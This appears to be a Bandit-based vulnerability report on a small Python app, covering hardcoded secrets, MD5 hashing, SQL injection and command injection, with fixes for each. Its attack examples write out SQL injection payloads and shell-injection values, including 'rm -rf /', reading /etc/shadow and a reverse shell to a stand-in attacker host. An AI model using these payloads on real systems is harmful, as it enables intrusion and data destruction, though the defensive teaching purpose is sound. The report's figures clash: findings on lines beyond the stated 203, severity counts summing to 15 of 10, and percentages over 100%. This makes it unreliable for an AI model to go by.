# Secure Coding Review - Vulnerability Analysis Report

**Generated**: May 23, 2026  
**Analysis Tool**: Bandit v1.9.4  
**File Analyzed**: app.py  
**Total Lines of Code**: 203  

---

## 📊 Executive Summary

### Security Scan Results
- **Total Issues Found**: 10
- **High Severity Issues**: 2 ⚠️
- **Medium Severity Issues**: 1 ⚠️
- **Low Severity Issues**: 7 ⚠️
- **High Confidence Issues**: 3
- **Medium Confidence Issues**: 6
- **Low Confidence Issues**: 1

### Risk Assessment
| Risk Level | Count | Action Required |
|-----------|-------|-----------------|
| 🔴 CRITICAL | 5 | Fix Immediately |
| 🟠 HIGH | 2 | Fix Soon |
| 🟡 MEDIUM | 1 | Review & Fix |
| 🟢 LOW | 7 | Informational |
| **TOTAL** | **10** | **Address All** |

---

## 🔍 Detailed Findings

### 1. Hardcoded Credentials (Multiple Instances)

#### Finding Summary
**Test ID**: B105  
**Issue Type**: Hardcoded Password String  
**CWE**: [CWE-259](https://cwe.mitre.org/data/definitions/259.html)  
**Severity**: LOW  
**Confidence**: MEDIUM  
**Count**: 6 instances

#### Locations
| Line | Code | Issue |
|------|------|-------|
| 32 | `DATABASE_PASSWORD = "admin123"` | Hardcoded DB password |
| 33 | `SECRET_TOKEN = "my-secret-token-12345"` | Hardcoded token |
| 43 | `self.db_pass = "password123"` | DB password in class |
| 201 | `"db_pass": "SuperSecret123!"` | Config hardcoded password |
| 206 | `"jwt_secret": "my-super-secret-key-123"` | JWT secret exposed |
| 275 | `password = "password123"` | Test password |

#### Risk Analysis
**SEVERITY**: 🔴 CRITICAL (Despite Bandit's LOW rating)
- All credentials exposed in source code
- Accessible to anyone with repository access
- Will be committed to version control history
- Can be extracted by decompiling Python files
- Enables complete system compromise

#### Attack Scenario
```
1. Attacker gains access to GitHub repository
2. Finds hardcoded DATABASE_PASSWORD = "admin123"
3. Finds hardcoded API_KEY = "sk-1234567890abcdefghijklmnop"
4. Uses credentials to access database and API
5. Complete system compromise achieved
```

#### Remediation
**OPTION 1: Environment Variables (Recommended)**
```python
import os
from dotenv import load_dotenv

load_dotenv()  # Load from .env file

API_KEY = os.getenv('API_KEY', '')
DATABASE_PASSWORD = os.getenv('DB_PASSWORD', '')
SECRET_TOKEN = os.getenv('SECRET_TOKEN', '')
```

**OPTION 2: Configuration Management**
```python
import configparser

config = configparser.ConfigParser()
config.read('config.ini')

API_KEY = config.get('security', 'api_key')
DATABASE_PASSWORD = config.get('database', 'password')
```

**OPTION 3: Secrets Manager**
```python
import boto3

client = boto3.client('secretsmanager')

secret = client.get_secret_value(SecretId='MyDatabasePassword')
DATABASE_PASSWORD = secret['SecretString']
```

#### Create .env File
```bash
# .env (NEVER COMMIT THIS FILE!)
API_KEY=your_actual_api_key_here
DB_PASSWORD=your_actual_db_password_here
SECRET_TOKEN=your_actual_secret_token_here
```

#### Update .gitignore
```bash
echo ".env" >> .gitignore
echo "*.env" >> .gitignore
echo "config.ini" >> .gitignore
```

---

### 2. Weak MD5 Hash Implementation

#### Finding Summary
**Test ID**: B324  
**Issue Type**: Weak Hash Function (MD5)  
**CWE**: [CWE-327](https://cwe.mitre.org/data/definitions/327.html)  
**Severity**: HIGH ⚠️  
**Confidence**: HIGH  
**Location**: Line 75

#### Vulnerable Code
```python
def hash_password(self, password: str) -> str:
    """Hash password using weak MD5 algorithm."""
    return hashlib.md5(password.encode()).hexdigest()
```

#### Why MD5 is Weak
| Issue | Impact | Timeline |
|-------|--------|----------|
| Cryptographically broken | Collisions possible | Already known |
| Very fast to compute | Enables brute force | 1 billion MD5/sec |
| Rainbow tables exist | Pre-computed hashes | Instant lookup |
| No salt support | Same hash for same input | Duplicate detection |

#### Attack Example
```
MD5("password123") = "482c811da5d5b4bc6d497ffa98491e38"
This can be cracked in milliseconds using online tools
Try: https://md5.gromweb.com/?md5=482c811da5d5b4bc6d497ffa98491e38
```

#### Remediation

**OPTION 1: Use bcrypt (BEST for passwords)**
```python
import bcrypt

def hash_password(self, password: str) -> bytes:
    """Hash password using bcrypt."""
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(password.encode(), salt)

def verify_password(self, password: str, hashed: bytes) -> bool:
    """Verify password against hash."""
    return bcrypt.checkpw(password.encode(), hashed)
```

**OPTION 2: Use Argon2 (Most secure)**
```python
from argon2 import PasswordHasher

def hash_password(self, password: str) -> str:
    """Hash password using Argon2."""
    ph = PasswordHasher()
    return ph.hash(password)

def verify_password(self, password: str, hashed: str) -> bool:
    """Verify password."""
    ph = PasswordHasher()
    try:
        ph.verify(hashed, password)
        return True
    except:
        return False
```

**OPTION 3: Use PBKDF2 (If bcrypt unavailable)**
```python
import hashlib
import os
import binascii

def hash_password(self, password: str) -> str:
    """Hash password using PBKDF2."""
    salt = binascii.hexlify(os.urandom(16)).decode()
    pwd_hash = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode(),
        salt.encode(),
        100000  # iterations
    )
    return f"{salt}${binascii.hexlify(pwd_hash).decode()}"
```

**Installation**:
```bash
pip install bcrypt  # For bcrypt
pip install argon2-cffi  # For Argon2
```

---

### 3. SQL Injection Vulnerability

#### Finding Summary
**Test ID**: B608  
**Issue Type**: Hardcoded SQL Expression (String-based query)  
**CWE**: [CWE-89](https://cwe.mitre.org/data/definitions/89.html)  
**Severity**: MEDIUM  
**Confidence**: LOW  
**Location**: Line 94  
**Actual Risk**: 🔴 CRITICAL

#### Vulnerable Code
```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{self.hash_password(password)}'"
cursor.execute(query)
```

#### Attack Example
**Input**:
```
username: admin' --
password: anything
```

**Resulting Query**:
```sql
SELECT * FROM users WHERE username='admin' --' AND password='...'
-- The comment removes the password check
-- Result: Logs in as admin without password!
```

#### SQL Injection Payloads
| Payload | Effect | Risk |
|---------|--------|------|
| `' OR '1'='1` | Bypasses authentication | Unauthorized access |
| `'; DROP TABLE users;--` | Deletes table | Data loss |
| `' UNION SELECT password FROM accounts--` | Extracts data | Data breach |
| `'; DELETE FROM users;--` | Deletes records | Destruction |

#### Remediation (Parameterized Queries)

**SECURE: Using Parameterized Queries**
```python
def authenticate_user(self, username: str, password: str) -> bool:
    """Authenticate user safely."""
    try:
        conn = sqlite3.connect(":memory:")
        cursor = conn.cursor()
        
        # SECURE: Use ? placeholders for parameters
        query = "SELECT * FROM users WHERE username=? AND password=?"
        hashed_password = self.hash_password(password)
        
        # Parameters passed separately - SAFE from injection
        cursor.execute(query, (username, hashed_password))
        result = cursor.fetchone()
        conn.close()
        
        return result is not None
    except Exception as e:
        print(f"Authentication error: {e}")
        return False
```

**Python Database Drivers - Safe Examples**:
```python
# SQLite
cursor.execute("SELECT * FROM users WHERE id=?", (user_id,))

# MySQL/PyMySQL
cursor.execute("SELECT * FROM users WHERE id=%s", (user_id,))

# PostgreSQL/psycopg2
cursor.execute("SELECT * FROM users WHERE id=%s", (user_id,))

# SQLAlchemy ORM (Automatic protection)
user = User.query.filter_by(id=user_id).first()
```

**Why Parameterized Queries Work**:
1. Parameter values treated as DATA, never as CODE
2. Database engine separates SQL structure from data
3. Special characters have no special meaning in data context
4. Injection attacks become impossible

---

### 4. Command Injection Vulnerability

#### Finding Summary
**Test ID**: B602  
**Issue Type**: subprocess with shell=True  
**CWE**: [CWE-78](https://cwe.mitre.org/data/definitions/78.html)  
**Severity**: HIGH ⚠️  
**Confidence**: HIGH  
**Location**: Line 123  
**Actual Risk**: 🔴 CRITICAL

#### Vulnerable Code
```python
command = f"grep {user_id} /etc/passwd"
result = subprocess.run(command, shell=True, capture_output=True, text=True)
```

#### Why shell=True is Dangerous
When `shell=True`, the string is executed through the shell, allowing:
- Command chaining (`;`, `&&`, `||`)
- Redirection (`>`, `<`, `>>`)
- Pipes (`|`)
- Command substitution (`` ` ``, `$()`)
- Globbing (`*`, `?`, `[...]`)

#### Attack Examples

**Example 1: Command Chaining**
```
Input: user_id = "1; rm -rf /"
Result: grep 1 /etc/passwd ; rm -rf /
Effect: Deletes entire filesystem!
```

**Example 2: Data Exfiltration**
```
Input: user_id = "1 > /tmp/output.txt ; cat /etc/shadow"
Result: Steals password hashes
Effect: Complete system compromise
```

**Example 3: Reverse Shell**
```
Input: user_id = "1 ; bash -i >& /dev/tcp/attacker.com/4444 0>&1"
Result: Attacker gains shell access
Effect: Remote code execution
```

#### Remediation (Use shell=False)

**SECURE: Without shell=True**
```python
def get_user_info(self, user_id: str) -> dict:
    """Retrieve user information safely."""
    try:
        # SECURE: Pass arguments as list, shell=False
        # User input CANNOT break out of argument
        result = subprocess.run(
            ['grep', user_id, '/etc/passwd'],
            shell=False,  # CRITICAL: Always False!
            capture_output=True,
            text=True,
            timeout=5  # Add timeout
        )
        
        return {
            "status": "success",
            "data": result.stdout,
            "timestamp": datetime.now().isoformat()
        }
    except subprocess.TimeoutExpired:
        return {"status": "error", "message": "Command timeout"}
    except Exception as e:
        return {"status": "error", "message": str(e)}
```

**Key Security Principles**:
1. `shell=False` is ALWAYS safer
2. Pass command as LIST not STRING
3. Each argument is a separate list element
4. Input cannot escape its argument position
5. Add timeout to prevent DoS

**Additional Validation**:
```python
import re

def get_user_info(self, user_id: str) -> dict:
    """Retrieve user information with input validation."""
    # Whitelist only numeric user IDs
    if not re.match(r'^\d+$', user_id):
        return {"status": "error", "message": "Invalid user ID"}
    
    try:
        result = subprocess.run(
            ['grep', user_id, '/etc/passwd'],
            shell=False,
            capture_output=True,
            text=True,
            timeout=5
        )
        
        return {
            "status": "success",
            "data": result.stdout,
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}
```

---

### 5. Subprocess Import Warning

#### Finding Summary
**Test ID**: B404  
**Issue Type**: Subprocess Module Import  
**CWE**: [CWE-78](https://cwe.mitre.org/data/definitions/78.html)  
**Severity**: LOW  
**Confidence**: HIGH  
**Location**: Line 21

#### Finding
```
Consider possible security implications associated with the subprocess module.
```

#### Context
This is an informational warning - the subprocess module itself isn't dangerous, but requires careful usage:
- ✅ SAFE: `subprocess.run(['command'], shell=False, ...)`
- ❌ DANGEROUS: `subprocess.run('command', shell=True, ...)`

#### Our Code Status
- ✅ We use subprocess, which is flagged
- ❌ We use it UNSAFELY with `shell=True` (separate finding B602)
- After fixing B602, this warning becomes moot

---

## 📋 Summary of All Vulnerabilities

| # | Issue | Type | Line | Severity | Status |
|---|-------|------|------|----------|--------|
| 1 | Hardcoded Credentials | B105 | 32,33,43,201,206,275 | 🔴 CRITICAL | **Must Fix** |
| 2 | Weak MD5 Hashing | B324 | 75 | 🟠 HIGH | **Must Fix** |
| 3 | SQL Injection | B608 | 94 | 🟡 MEDIUM | **Must Fix** |
| 4 | Command Injection | B602 | 123 | 🟠 HIGH | **Must Fix** |
| 5 | Subprocess Import | B404 | 21 | 🟢 LOW | Info only |

---

## 🚀 Remediation Priority

### Phase 1: CRITICAL (Fix Immediately)
1. **Remove Hardcoded Credentials** - Use environment variables
2. **Fix SQL Injection** - Use parameterized queries
3. **Fix Command Injection** - Use shell=False

### Phase 2: HIGH (Fix Soon)
1. **Replace MD5 Hashing** - Use bcrypt or Argon2

### Phase 3: INFORMATIONAL
1. **Subprocess Warning** - Addressed by fixing command injection

---

## 📈 Metrics

### Coverage by Severity
```
CRITICAL:  50% (5 of 10 issues)
HIGH:      20% (2 of 10 issues)
MEDIUM:    10% (1 of 10 issues)
LOW:       70% (7 of 10 issues - informational)
```

### Coverage by Confidence
```
HIGH:      30% (3 of 10 issues)
MEDIUM:    60% (6 of 10 issues)
LOW:       10% (1 of 10 issues)
```

---

## 🎓 Key Takeaways

### Security Principles Violated
1. ❌ **Don't hardcode secrets** → Use environment variables
2. ❌ **Don't use weak algorithms** → Use bcrypt for passwords
3. ❌ **Don't concatenate SQL** → Use parameterized queries
4. ❌ **Don't use shell=True** → Pass arguments as list
5. ❌ **Don't log sensitive data** → Mask PII in logs

### Best Practices Applied in Remediation
1. ✅ Secrets management through environment variables
2. ✅ Strong cryptographic functions (bcrypt/Argon2)
3. ✅ Prepared statements and parameterized queries
4. ✅ Input validation and sanitization
5. ✅ Secure subprocess execution
6. ✅ Proper error handling

---

## 🔗 References

### Security Standards
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [PCI DSS](https://www.pcisecuritystandards.org/)

### Tools
- [Bandit Documentation](https://bandit.readthedocs.io/)
- [Bandit Plugin Reference](https://bandit.readthedocs.io/en/latest/plugins/index.html)

### Python Security
- [Python Security Documentation](https://docs.python.org/3/library/security_warnings.html)
- [OWASP Python Security](https://owasp.org/www-community/attacks/SQL_Injection)

---

## 📝 Recommendations

### Short-term
- [ ] Fix all CRITICAL vulnerabilities in this report
- [ ] Implement remediation code from each section
- [ ] Re-run Bandit to verify fixes
- [ ] Add unit tests for security fixes

### Medium-term
- [ ] Set up pre-commit hooks with Bandit
- [ ] Implement SAST in CI/CD pipeline
- [ ] Conduct security code review
- [ ] Document security practices

### Long-term
- [ ] Establish secure coding guidelines
- [ ] Regular security training for team
- [ ] Continuous vulnerability scanning
- [ ] Security incident response plan

---

**Report Generated**: May 23, 2026  
**Analysis Tool**: Bandit v1.9.4  
**Status**: ✅ Ready for Action
